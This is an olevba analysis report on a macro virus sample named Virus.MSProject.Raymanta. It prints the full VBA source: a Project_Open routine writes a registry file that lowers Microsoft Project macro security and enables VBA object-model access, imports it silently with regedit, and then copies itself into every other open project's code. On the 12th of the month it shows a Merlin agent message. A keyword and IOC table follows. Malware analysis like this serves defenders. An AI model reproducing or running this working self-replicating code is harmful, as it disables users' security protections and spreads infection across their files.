olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSProject.Raymanta
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSProject.Raymanta - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Project_Open(ByVal pj As Project)
 '
 First = Dir("c:\mantaray.reg")
 If First <> "mantaray.reg" Then
 Open "c:\mantaray.reg" For Output As 1
 Print #1, "REGEDIT4"
 Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\MS Project\Security]"
 Print #1, """Level""=dword:00000001"
 Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\MS Project\Security]"
 Print #1, """AccessVBOM""=dword:00000001"
 Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\MS Project\Security]"
 Print #1, """DontTrustInstalledFiles""=dword:00000000"
 Close 1
 Shell "regedit /s c:\mantaray.reg"
 GoTo out
 End If
 For Each Z In Projects
 On Error Resume Next
 Set Target = Z.VBProject.VBComponents(1).CodeModule
 Set tp = ThisProject.VBProject.VBComponents(1).CodeModule
 If Target.Lines(2, 1) <> "'" Then
 Target.DeleteLines 1, Target.CountOfLines
 Target.InsertLines 1, tp.Lines(1, tp.CountOfLines)
 End If
 Next Z
 Set temp = Application.VBE.VBProjects(1).VBComponents(1).CodeModule
 If temp.Lines(2, 1) <> Chr(39) Then
 temp.DeleteLines 1, temp.CountOfLines
 temp.InsertLines 1, tp.Lines(1, tp.CountOfLines)
 End If
out:
 If (Day(Now)) = 12 Then
 On Error GoTo gone
 Set speaky = CreateObject("Agent.Control.1")
 speaky.connected = True
 If VBA.IsObject(speaky) Then
 speaky.Characters.Load "Merlin", "Merlin.acs"
 Set merl = speaky.Characters("Merlin")
 End If
 With merl
 .Show
 .play Animation:="Read"
 .speak "The Stars are out tonight , and your the brightest one shining in my sky..."
 .speak "would you be my best friend , if i offered you my heart"
 .speak "cuz its already yours...."
 .speak "eeek its a Project two thousand and two virus"
 .speak "yesterday , today , tomorrow , forever ... all your office products are belong to us"
 .speak "with Love always .... the antistate tortoise"
 .hide
 End With
 Do Until merl.hide.Status = 0
 DoEvents
 Loop
 End If
gone:
 '[AsT]
 'Metaphase/Tantrum
 End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |mantaray.reg        |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

